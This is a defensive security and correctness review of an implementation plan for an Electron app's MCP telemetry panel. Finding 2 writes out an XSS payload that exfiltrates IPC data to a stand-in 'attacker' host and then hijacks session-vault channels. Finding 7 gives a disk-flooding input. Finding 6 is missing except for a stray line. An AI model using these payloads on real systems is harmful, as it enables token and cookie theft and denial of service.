## Finding 1: The plan's central computation reads frame fields that do not exist (`frame.intent.name`, `startedAt`, `frame.id == composite`)

- **Severity:** Critical
- **Location:** Phase 3, Requirements §Functional ("one row per distinct `frame.intent.name`"), Architecture block ("Row key: `frame.intent.name`", "Latency pair: terminal frame's `settledAt` − its own `startedAt`"), Implementation Step 1 ("freeze the frame type … `{ id, idempotencyKey, attachmentId, intent, state, startedAt, settledAt?, error?, result?, checksum }`"); Phase 2 Requirements (`readAdmittedFrames(census)`), Phase 4 step 7 item 7 (`selectMcpDispatchRow`).
- **Flaw:** `InvocationRecord` is **flat**. There is no nested `intent` object and no `startedAt` field. The recorded name is the top-level `name`; the start timestamp is `createdAt`. The plan also asserts the composite key "(== `frame.id`)", but `frame.id` is `makeControlPlaneId('invocation')` — an invocation id, entirely unrelated to `attachmentId + idempotencyKey`.
- **Failure scenario:** An implementer follows Phase 3 literally. `frame.intent` is `undefined` → `frame.intent.name` throws on every frame, or (if defensively coded) every frame lands in `unattributed`. Then: zero rows, `reconcile()` reports `classified 0 + unattributed 18962 == composite keys 18704` → `holds === false` forever, and the Phase 4 acceptance ("Hub tab shows, per recorded dispatch name: call count …") cannot pass. Latency becomes `settledAt - undefined = NaN`; `nearest-rank` on `NaN` yields `NaN`, `JSON.stringify` emits `null`, so latency renders as UNMEASURED for every tool even when samples exist, and the plan's own measured baseline (p50 13 ms) can never be reproduced. Phase 2/3 gates are green in isolation (unit fixtures are hand-built in the test file), so the defect survives to the Hub.
- **Evidence:** `src/main/session/invocation-ledger.ts:19-45` — fields are `formatVersion, id, attachmentId, requestId, idempotencyKey, name, paramDigest, policyDigest, policyVersion, recordedVisibility, state, dispatchStage?, authoritySnapshot, result?, error?, evidence?, replacementAuthorityRevision?, artifactIds?, createdAt, settledAt?, checksum?`. No `intent`, no `startedAt`. `grep "startedAt" src/main/session/invocation-ledger.ts` → 0 matches. `:394` `name: intent.name` (the intent is a *parameter* at `:355`, never persisted as an object). `:386-390` `id: invocationId` / `makeControlPlaneId('invocation')`. A live frame confirms the flat shape: `{"...","idempotencyKey":"idem-mcp-1579ef4cb9391553","name":"browser.reload",...,"createdAt":1789030556398,...,"settledAt":1789030556427}`.
- **Suggested fix:** Rewrite Phase 3's frame contract to the real `InvocationRecord`: row key `frame.name`, latency `settledAt - createdAt`, identity `attachmentId + '\u0000' + idempotencyKey` (delete the `== frame.id` parenthetical), and add a Phase 3 gate assertion that the consumed field set is derived from `InvocationRecord` (compile-time `Pick<InvocationRecord, …>`) rather than restated as prose.

## Finding 2: Panel B renders attacker-controlled MCP text through the toolbar `innerHTML` row idiom → stored XSS in a renderer whose origin passes every trust gate

- **Severity:** Critical
- **Location:** Phase 5, Requirements §Functional line 19 (classify + return `records[]`), line 27 ("No new redaction logic … The reader displays what was written"), Success Criteria line 79 ("Records are displayed exactly as sanitized by the writer; no new redaction … logic exists in the reader"), matrix row T5-6 ("PII passthrough … displayed exactly as the writer sanitized it"); Phase 4, Implementation Step 4 item 7 ("Rows render as `div.hub-list-item` like `:621-630`").
- **Flaw:** The records Panel B consumes are **written from MCP call arguments** and are only length/newline-sanitized. The plan makes "display what the writer wrote, add no redaction or escaping" an explicit acceptance criterion, and points the row renderer at the existing `toolbar.ts:621-630` idiom — which is `item.innerHTML = \`…\``. `escapeHtml` exists (`toolbar.ts:1122`) but neither Phase 4 nor Phase 5 requires it, and no acceptance criterion tests it. The values are rendered into the same renderer that exposes `window.antifanToolbar`.
- **Failure scenario:** Any MCP client that holds the `anti.telemetry.record_fallback` capability (it is a registered, *advertised* capability; the ledger already contains 16 `anti.telemetry.record_fallback` dispatches) calls it once with `{"primaryTool":"<img src=x onerror=\"...\">","fallbackTool":"pw","fallbackResult":"SUCCESS","notes":"<img src=x onerror=\"fetch('https://attacker/?t='+JSON.stringify(await window.antifanToolbar.getMcpDispatchState()))\">"}`. `sanitizeString` strips only `\r?\n` and truncates, so the markup is persisted verbatim into `gaps.jsonl`. The operator opens Hub → "MCP Dispatch" → Panel B; the row `innerHTML` assignment executes the handler inside `toolbar.html`. Because that document's origin is exactly what `isTrustedSessionVaultSender` whitelists, the injected script then passes every gated channel: `antifan:copy-bridge-token` (`native-tab-host.ts:1232-1243`), `antifan:rotate-bridge-token`, `antifan:vault:export` and `antifan:vault:import-json` (`src/main/browser/local-session-vault.ts:480-489`, `:528-531`). Net effect: one telemetry write → bridge token + full cookie/session-vault exfiltration → full control-plane takeover.
- **Evidence:** `src/main/tools/browser-capabilities.ts:948-968` — `anti.telemetry.record_fallback`, `risk: 'write'`, `execute: async (params, context) => recordFallbackTelemetry(params, …)`: all of `sessionId/targetUrl/primaryTool/errorCode/errorMessage/fallbackTool/notes` come straight from MCP params. `src/main/telemetry/fallback-recorder.ts:95-101` `sanitizeString` = `slice(0,maxLen).replace(/\r?\n|\r/g,' ').trim()` — no markup filtering. `src/renderer/toolbar.ts:621-630` row rendering is `item.innerHTML` (escaping only because of `:623-626`'s explicit `escapeHtml` calls, which the plan does not mandate). `src/renderer/toolbar.ts:1122-1129` `escapeHtml` exists. `src/main/browser/local-session-vault.ts:65-89` `isTrustedSessionVaultSender` returns `true` for any `file:` top frame with `pathname.includes('/renderer/')` or ending `toolbar.html` — i.e. for the injected script's own frame. Counter-check that *reduces* the vector's other branches: tool names cannot be attacker-injected (catalogue lookup precedes the ledger claim, `src/main/tools/capability-transport.ts:254-265`), which is why Panel B — not Panel A — is the live injection surface.
- **Suggested fix:** Add a hard requirement: every ledger/self-report-derived string rendered into the Hub must pass `escapeHtml` (or be assigned via `textContent`), and add a renderer test row that seeds `<img src=x onerror=…>` into `notes`/`primaryTool`/`errorCode` and asserts the DOM contains no element and no attribute. Drop the "no new redaction logic" absolutism: length-capped HTML-escaping at the render boundary is required, and Phase 7's doc note must say so.

## Finding 3: Panel B's mandated root resolver provably cannot reach the second live store the plan requires it to report

- **Severity:** High
- **Location:** Phase 5, Requirements §Non-functional line 26 (mirror the writer's resolution: "registry `rootPath` with its exclusions (empty, `=== dataRoot`, `=== path.resolve(dataRoot,'..')`, `!existsSync` …), then `THEME_WORKSPACE_ROOT || ANTIFAN_WORKSPACE_ROOT || WORKSPACE_ROOT`"), Requirements line 21 and Implementation Step 6 / Success Criteria (`405 records at the repo root and 2 at the data root, as two rows`).
- **Flaw:** The 2-record store *is* `<dataRoot>/.antifan/telemetry/gaps.jsonl`. The resolver the plan orders the reader to mirror **excludes `=== dataRoot`** and falls through to the env trio, which — per the same function — yields `''` → the plan's own `NO_DATA` path. So the mandated resolution can never produce the root whose 2 records are a Success Criterion, and the reader must therefore glob a root the plan simultaneously forbids it to resolve.
- **Failure scenario:** The implementer "mirrors the writer" exactly as instructed. Panel B reports one root (repo root, 405 records), renders `NO_DATA` for the second, and fails Step 6's manual reconciliation. Worse, if the implementer instead "fixes" it by widening resolution to the data root, the panel silently starts globbing a directory that `StorageLocations.getDataRoot()` creates on a cold cache — colliding with this plan's own P0 zero-write/list-only rule. Either way the acceptance criterion and the resolution rule cannot both hold, so the failure is only discovered at Step 6, after Phases 1-4 are built on the payload shape.
- **Evidence:** `src/main/control-plane/control-plane-runtime.ts:262-271` (registry `rootPath` accepted only if `!== dataRootResolved && !== dataParentResolved && fs.existsSync`) and `:275-287` (env trio, else `resolved = ''`); `:148-149` (`return ''`); `src/main/config/storage-locations.ts:41-46` (data root candidate `E:\Work\.antifan-data`). Measured: `E:\Work\.antifan-data\.antifan\telemetry\gaps.jsonl` exists with **2** records; `.antifan\telemetry\gaps.jsonl` (repo root) has **405** records — matching plan.md:71 and Phase 5 line 21 exactly.
- **Suggested fix:** Separate the two concerns the plan conflates: (a) *writer-reachable roots* — enumerate them explicitly, including the data root and `process.cwd()`-derived candidates, with the rationale that these are exactly the locations the writer's `''`-collapse can reach; (b) *reader discipline* — never create/resolve a root, only glob roots that already exist. Restate Success Criterion line 74 as "the data-root store is discovered as an explicit candidate root, and is disclosed, not resolved".

## Finding 4: The "ungated" trust decision is justified by a false equivalence, and the toolbar webContents has no navigation guard — the payload is harvested cross-session history, not a catalogue

- **Severity:** High
- **Location:** Phase 4, Requirements §Functional line 20 ("New IPC channel `antifan:mcp-dispatch:get-state`, read-only, **ungated** (matching 4/4 existing read-only aggregate precedents: `antifan:workflow:get-state` `native-tab-host.ts:2057`, `antifan:core-health:get-state` `:2226`, `:2242`, `antifan:capsule:list` `:2248`)"), and Phase 5 line 64 (Panel B handler "same ungated read-only class").
- **Flaw:** The precedent list is factually correct but the *inference* is not: none of the four precedents returns a record of what was actually done. `workflow:get-state` returns the registry + the advertised capability catalogue (public by construction — every MCP client already sees it); `core-health:get-state` returns health counters; `capsule:list` returns a directory listing of capsules. This plan's payload returns: per-tool call volumes and terminal-state mixes, an `error.code` histogram, the **absolute** `storePath`, and (Panel B) **absolute root paths and every telemetry file path**, plus the customer URLs inside those records. It is a reconnaissance artefact about the human operator and the tenants they work on — the first of its class in this codebase — and it is shipped on a channel with no sender check while the same codebase gates even `workflow:get-artifact` on a caller-named id (`native-tab-host.ts:2072-2073`).
- **Failure scenario:** The toolbar renderer's origin is the only thing gating the channel. `this.toolbarView` is created with `toolbar-preload.js`, `contextIsolation: true`, `sandbox: false`, and **no `will-navigate` or `setWindowOpenHandler` handler on its `webContents`** (the guards at `:3608` and `:3925` are attached to per-tab webContents; the only toolbar/sidebar webContents listener is `:997` `did-finish-load`). Any code that ends up executing in that document (Finding 2's XSS, a future renderer dependency, an `<a href>` that is not intercepted) inherits `window.antifanToolbar` on every navigation, and can then `await window.antifanToolbar.getMcpDispatchState()` to exfiltrate the operator's full dispatch history, the Windows data-root path, and Panel B's customer domains — without needing any of the gated channels. The plan treats this as an accepted precedent rather than an evaluated design decision, so there is no compensating control (no `getMcpDispatchState` field allowlist, no path redaction, no sender check) anywhere in Phases 4-7.
- **Evidence:** `src/main/browser/native-tab-host.ts:2057-2070` (workflow state = `workflowRegistry.getAll()` + `capabilities.listAll()`), `:2226-2246` (core health), `:2248-2252` (capsule list) — the four precedents; `:966-969` (`preload: toolbar-preload.js`, `contextIsolation: true`, `sandbox: false`); grep for `toolbarView.webContents.(on|setWindowOpenHandler)` → the single hit is `:997`; `:1232-1243`, `:1257-1262`, `:2072-2073` show the codebase's own gating convention (`isTrustedSessionVaultSender`, `src/main/browser/local-session-vault.ts:65-89`); Phase 1 step 1 freezes the envelope with `storePath` and `evidenceRefs` and no redaction rule.
- **Suggested fix:** Either gate the two new channels with `isTrustedSessionVaultSender` (returning a well-formed `UNMEASURED` payload, per the plan's own rule, so the renderer never sees `null`), or — if the precedent must be followed — make the payload path-free and history-free at the wire: hash/truncate `storePath` to a display label, forbid absolute paths in Panel B's payload (disclose them only in the on-disk receipt), and add an explicit "no absolute filesystem path, no URL, no session id crosses IPC" acceptance criterion. Then add a `will-navigate` guard for the toolbar webContents as a precondition, not a follow-up.

## Finding 5: Phase 6's own emitter snippet records `ok` for every failure — `finally` runs before the un-awaited `invokeCore` promise settles

- **Severity:** High
- **Location:** Phase 6, Implementation Step 3 (the prescribed wrap at lines 74-82), Success Criteria line 92 ("exactly one bounded record per attempt containing `method`, `requestedAs`, `outcome`, …"), matrix T6-2.
- **Flaw:** The snippet is `try { return invokeCore(mappedEarly, params); } catch (err) { outcome = 'error'; … throw err; } finally { emitCoreAttempt({ …, outcome, errorCode, durationMs: Date.now() - t0 }); }`. `invokeCore` is `async`, so `invokeCore(...)` returns a **pending promise**; `return`ing it from a `try` executes the `finally` block synchronously, before the promise settles, and a rejection inside the async function never reaches this `catch`. `outcome` is therefore always `'ok'`, `errorCode` always `undefined`, and `durationMs` always ≈0 ms (a few microseconds).
- **Failure scenario:** Every failing `core.*` dispatch is recorded as a success with a 0 ms duration. The new accounting surface — this plan's whole deliverable — reports `outcome: ok` for the 51 `core.*` tools regardless of reality, while Phase 6 ships a unit test (T6-2) that only asserts "exactly one bounded record", which passes. The error histogram the operator is supposed to trust becomes a fabrication produced by the plan's own reference implementation. The same snippet also makes the stated security posture ("Never throw … The emit runs in its own `try/catch` after the outcome is known", Req line 26) untrue: the outcome is never known at emit time.
- **Evidence:** `scripts/antifan-omp-mcp.cjs:522` `async function invokeCore(method, params) {`; `:1534-1535` `if (mappedEarly.startsWith('core.')) { return invokeCore(mappedEarly, params); }`; `:1928-1930` shows the outer handler already treats a throw from `invoke` as `{isError:true}`, i.e. rejections are the normal failure channel — nothing is thrown synchronously at the `:1535` call site. Phase 6 step 4 additionally prescribes `statSync` **before** appending on the same hot path, contradicting Non-functional line 27 ("Never block … Append asynchronously and never await it"): `statSync` is a synchronous filesystem call in the `finally` of every `core.*` dispatch.
- **Suggested fix:** Make the emit path promise-aware and non-blocking: capture `const t0 = performance.now()` (or `Date.now()`), call `const p = invokeCore(...)`, and attach `p.then(() => emit({outcome:'ok'})).catch((err) => emit({outcome:'error', errorCode: err?.code || 'ERROR'})).finally(...)` — or `await` inside the async `invoke` with the `try/catch/finally` around the `await`. Move the rotation/cap check off the caller's path (queue it in the async writer), and add a Phase 6 test that forces a `core.*` rejection and asserts `outcome === 'error'` and `durationMs > 0`.

(c) Record "sanitizer denylist is name-based" as an explicit limitation of the panel, not as a guarantee.

## Finding 7: The Phase 6 emitter has no per-record size bound and unbounded rotation — a rogue MCP client can fill the operator's disk and the main-process-adjacent memory

- **Severity:** Medium
- **Location:** Phase 6, Requirements line 21 (`{ timestamp, method (post-CAPABILITY_MAP name), requestedAs (the caller-typed name), … }`) and line 24 ("Rotation and a hard cap mirror the proven self-report discipline: rotate at a byte cap to `core-attempts-<ts>.jsonl`"); Implementation Step 4 (cap check immediately before append); plan.md:146 (rotation "with no cap on the rotated count and no pruning" — a condition the plan reports but does not fix).
- **Flaw:** `requestedAs` is the raw caller-supplied method string and `method` is `CAPABILITY_MAP[method] || method` — i.e. also caller-derived for anything beginning `core.`. Nothing in Phase 6 bounds either field, unlike every other writer in the repo (`sanitizeString(val, maxLen)` at `fallback-recorder.ts:95-101`; `Buffer.byteLength(line) > maxFrameBytes` rejection at `invocation-ledger.ts:803`). The cap check runs *before* the append, so a single oversized record is written in full; and rotation is timestamp-named with no count limit and no pruning, so the record count is attacker-scalable.
- **Failure scenario:** An MCP client issues `core.*` calls whose method is `"core." + "A".repeat(50_000_000)` (still satisfies `startsWith('core.')` and misses `CAPABILITY_MAP`). With `ANTIFAN_PROXY_TELEMETRY_DIR` injected, the emitter JSON-stringifies and appends ~50 MB per call after a `statSync` that reported "under the cap"; a few dozen calls rotate the file dozens of times and consume gigabytes under the app data root. Because the append is fired-and-forgotten (Requirement line 27), the pending-write queue grows without bound too. The same plan that documents the uncapped-rotation hazard in its Cross-Plan Notes reproduces it in a new store.
- **Evidence:** `scripts/antifan-omp-mcp.cjs:1533` (`const mappedEarly = CAPABILITY_MAP[method] || method;`) — no length or charset validation of `method` anywhere upstream in `invoke` (`:1505-1560`); `src/main/telemetry/fallback-recorder.ts:95-101` shows the house pattern of bounding every string; `src/main/session/invocation-ledger.ts:803-805` shows the house pattern of rejecting an oversized frame; `plans/260917-0341-mcp-dispatch-accounting/plan.md:146` (uncapped rotated count, no pruning).
- **Suggested fix:** Bound the record: reject/normalize `method`/`requestedAs` to ≤128 chars matching a tool-name pattern, cap `errorCode` to 64, and refuse (do not truncate-and-write) any serialized record over a small fixed byte budget. Cap the *number* of rotated files (or the directory byte total) and refuse past it, and make the refusal path the same one-shot stderr notice as `proxyTelemetryUnavailable`.

## Finding 8: Phase 6's stated justification for not wrapping `invokeCore` is contradicted by the gate it cites

- **Severity:** Medium
- **Location:** Phase 6, Requirements §Non-functional line 30 and Risk table line 140 ("the emitter must not run during `npm run compile`: the budget gate executes every catalogue `core.*` binding (`scripts/check-mcp-budget-dominance.mjs:305-317`), which is why the emitter wraps the dispatch call site and not `invokeCore`"); plan.md:73.
- **Flaw:** `check-mcp-budget-dominance.mjs:305-317` iterates `advertisedCore`, resolves `def = catalogue.get(name)` (`:306`) and calls `def.execute(SENTINEL_PARAMS, {})` (`:311`). `catalogue` is built from `SUPER_CORE_SRC = packages/super-core/src/index.ts` (`:47`) and the src-tree catalogue — it is **not** `scripts/antifan-omp-mcp.cjs`. Nothing in the gate calls the proxy's `invokeCore`; the gate compares `coreDispatch[name][0]` (a string) against the method the catalogue binding recorded (`:314-315`). So an emitter placed inside `invokeCore` would not be executed by the compile chain at all.
- **Failure scenario:** The premise is wrong but the conclusion is safe, so the plan ships a Risk-table entry that asserts a hazard which does not exist. The cost is real at review time: the Risk table's only stated reason for the (correct) insert point is falsified by inspection in ~30 seconds, which erodes confidence in the surrounding Phase 6 claims — notably Finding 5's broken wrapper and Finding 7's missing bounds, which the same table does *not* flag. An implementer who "corrects" the record by moving the emitter into `invokeCore` on the strength of a *different* reading would silently stop recording `requestedAs` and the caller-visible path.
- **Evidence:** `scripts/check-mcp-budget-dominance.mjs:47` (`SUPER_CORE_SRC = path.join(ROOT,'packages','super-core','src','index.ts')`), `:305-317` (`for (const name of advertisedCore) { const def = catalogue.get(name); … def.execute(SENTINEL_PARAMS, {}); … }` — no reference to `invokeCore`). `scripts/antifan-omp-mcp.cjs:522` / `:1535` show `invokeCore` lives in the proxy. The gate's own `--proxy <fixture>` flag (`:30`) substitutes a *fixture proxy module* for import parity checks, not for execution.
- **Suggested fix:** Replace the justification with the true one: the emitter wraps `:1534-1536` because (a) that is where the caller's raw name and the post-`CAPABILITY_MAP` name are both in scope, and (b) `invokeCore` returns before `requestedAs` exists as a distinct value. Then re-audit the Risk table for *actual* compile-chain interaction (`check-emit-integrity.mjs`, `prune-orphan-emit.mjs`) rather than the budget gate.

## Finding 9: No projection/redaction contract between the admitted frames and the IPC payload — every frame carries a `runtimeLeaseToken`, and the envelope's `evidenceRefs`/`affected` are undefined

- **Severity:** Medium
- **Location:** Phase 1, Implementation Step 1 (frozen envelope `{ status, reasonCode, affected: string[], evidenceRefs: string[], asOf, storePath, census, rows, totals, reconciliation }`); Phase 3, Implementation Step 1 ("Read `invocation-ledger.ts:19-45` and freeze the frame type this phase consumes") and Step 6; Phase 4, Architecture (`IPC handler` → `renderer`).
- **Flaw:** The reader's `admitted` set is the **full** `InvocationRecord[]`. The plan freezes the envelope's key *names* but never states which fields survive to the renderer, and it leaves `evidenceRefs: string[]` and `affected: string[]` semantically undefined. Meanwhile every persisted frame — including terminal ones — carries `authoritySnapshot` with `runtimeLeaseToken`, `runtimePid`, `runId`, `attemptId`, `revisionNumber`, `projectId`, `workspaceId`, `tabId`, `browserEpoch`, plus `requestId` and `error.details`. There is no line in Phases 1-4 that says "raw frames never cross the IPC boundary".
- **Failure scenario:** `evidenceRefs` gets populated with per-row frame references (or the detail pane gets `rows[i].frames` for a "sample" view) and the renderer — reachable via the ungated channel of Finding 4 — receives live lease tokens and tenant authority identifiers. A lease token is exactly the kind of value the codebase guards elsewhere (`antifan:copy-bridge-token` is gated, and the launcher strips the bridge token from `childEnv`), so leaking it here would be a privilege-relevant disclosure rather than a cosmetic one. Because the plan's acceptance matrix asserts only counts, strings and `UNMEASURED` rendering, nothing in Phases 4-7 would catch it.
